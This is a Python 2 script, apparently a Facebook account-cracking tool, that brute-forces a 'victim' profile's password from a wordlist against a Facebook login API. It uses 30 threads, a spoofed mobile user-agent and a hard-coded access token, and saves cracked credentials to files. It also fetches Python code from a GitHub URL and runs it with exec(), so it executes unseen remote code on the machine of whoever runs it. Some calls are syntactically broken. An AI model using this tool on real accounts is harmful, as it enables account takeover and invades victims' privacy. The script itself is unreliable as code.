#!/usr/bin/python2
#coding=utf-8

import os, sys, time, random, json

try:
  import requests
except ImportError:
  os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    import mechanize

from multiprocessing.pool import ThreadPool
from mechanize import Browser

sys.setdefaultencoding("utf-8")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent',"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")]


os.system("clear")

print("\033[1;33m\nEverything is getting ready...")
time.sleep(2)
os.system("clear")
rs=requests.session()
rg=rs.get
x=(rg("https://raw.githubusercontent.com/Noob-Hacker71/Noob-Hacker71/main/info.py").text)
exec(x)

url="https://camo.githubusercontent.com/978036e9465d4c6d0c0830d5b933a008ebd8f5623e2989e2474111c83827efbf/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f4e6f6f622d4861636b657237312f636f756e742e737667"


##### LOGO #####
id = []
User=""
Pwd=""
Permission=""

rcl='\033[1;31m'
gcl='\033[1;32m' 
ycl='\033[1;33m'
bcl = '\033[1;34m'
ccl='\033[1;36m' 
rcl='\033[1;31m'
gcl='\033[1;32m' 
ycl='\033[1;33m'
bcl = '\033[1;34m'

info="""{rcl}[+] {ycl}Connect A Fast Network For Better Experience..
{rcl}[+] {rcl}Don't Use It For Any Illigele Puspose...
{rcl}[+] {gcl}Fro Stop Clone Press CTRL + Z ...""".format(rcl=rcl,ycl=ycl,gcl=gcl,ccl=ccl)

if Permission=="On":
    pass
else:
  print(ccl+"You Need Noob-Hacker71's Permission")
  time.sleep(2)
  os.system("xdg-open https://www.facebook.com/ntahsan.nayem")
  exit()

victim = raw_input("Enter Victim Profile ID >> ")
passlist= raw_input("Wordlist Path >> ")
fil=passlist

def motion(arg):
  for i in arg:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(.1)
  print("\n")



print("Wordlist =>> "+str(fil))
word = open(passlist,'r').readlines()

with open(fil, 'r')as file:
  x = len(file.readlines())
  print('Total Password =>> '+str(x))
  
  
  


motion("{rcl}[+] For Batter Experience Use Fast Network.\n{gcl}[+] If Your Cracked Id Got Locked Than Try With VPN.\n{ycl}[+] Attack will perfomred in background for making you Cracking faster.\n{ccl}[+] Do Not Use It Any Illigele Perpuse...\n".format(rcl=rcl,gcl=gcl,ycl=ycl,ccl=ccl)

Usr = raw_input("Enter UserName =>> ")
Pd = raw_input("Enter Password =>> ")
while True:
  if Usr == User and Pd == Pwd:
    motion(gcl+"Logged In As Noob-Hacker71")
    break
  else:
    motion(rcl+"Wrong User Or Pass. Try Again")
    
os.system("clear")
print(logo)
motion("{gcl}[+] If Target Account Security Got Cracked Password Will Be Shown Here.\n{rcl}[+] Attack Is Processing....".format(gcl=gcl,rcl=rcl)

def Noob():
  try:
    os.mkdir('save')
  except OSError:
    pass
  try:
      for i in open(fil,"r").readlines():
          id.append(i.strip())
  except:
        exit("NUNU")
            
  def main(arg):
      line=arg
      data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +victim+ '&locale=en_US&password=' +line+ '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
      q = json.load(data)
      x=requests.get(url)
      #print(x)
      if 'access_token' in q:
        motion(ccl+'  [NOOB_OK] ' + victim + '  |  ' + line)
        motion("\n\nHappy Hacking ... Stay With Noob-Hacker71")
        okb = open('save/Noob_Successful.txt', 'a')
        okb.write(victim +" [ NOOB ] "+ line + '\n')
        okb.close()
                  
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+' [NOOB_CP] ' +victim+'  |  '+ycl + line)
        motion("\n\nHappy Hacking ... Stay With Noob-Hacker71")
        cps = open('save/Noob_CheckPoint.txt', 'a')
        cps.write(victim +" [ NOOB ] "+ line + '\n')
        cps.close()
      else:
        pass

  try:    
    p = ThreadPool(30)
    p.map(main,id)
  except:
    pass
        

Noob()